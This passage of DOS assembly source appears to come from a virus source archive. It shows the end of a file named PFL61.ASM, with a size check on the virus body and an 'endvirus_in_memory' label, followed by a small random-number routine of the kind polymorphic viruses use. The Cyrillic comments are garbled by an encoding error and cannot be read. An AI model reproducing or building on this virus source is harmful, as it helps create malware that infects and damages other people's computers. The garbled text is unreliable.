;����������������������������������������������������������������������������
.errnz ($-virus) GT 4000H ;�᫨ ��� ����� ࠧ���� � ࠧ���� ����� 祬 16K
;����������������������������������������������������������������������������
endvirus_in_memory:
pfl   endp
seg_a ends
end   start
����������������������������������������������������������������[PFL61.ASM]���
���������������������������������������������������������������[RANDOM.ASM]���
;����������������������������������������������������������������������������
; �p��p���� ��p���⪨ ��砩���� �᫠
; �室:  OLD_AX
; ��室: 0<=NEW_AX<=OLD_AX
random_any_ax:
        mov      ax,0fffeh
random_ax:
        xchg     ax,dx
        call     random_dx
        xchg     ax,dx
        retn
;����������������������������������������������������������������������������
; �p��p���� ��p���⪨ ��砩���� �᫠
; �室:  OLD_DX
; ��室: 0<=NEW_DX<=OLD_DX
random_any_dx:
        mov      dx,0fffeh
random_dx:
        push     ax bx dx
        call     init_rnd_proc
cell_for_rnd_number dw 0100h
init_rnd_proc:
        pop      bx
        imul     ax,word ptr cs:[bx],4dh
        inc      ax
        mov      word ptr cs:[bx],ax
        pop      bx
        inc      bx
        or       bx,bx
        jz       quit_from_rnd
        xor      dx,dx
        div      bx   ;DX:AX / BX  -> AX:DX
quit_from_rnd:
        pop      bx ax
        retn
;����������������������������������������������������������������������������
���������������������������������������������������������������[RANDOM.ASM]���
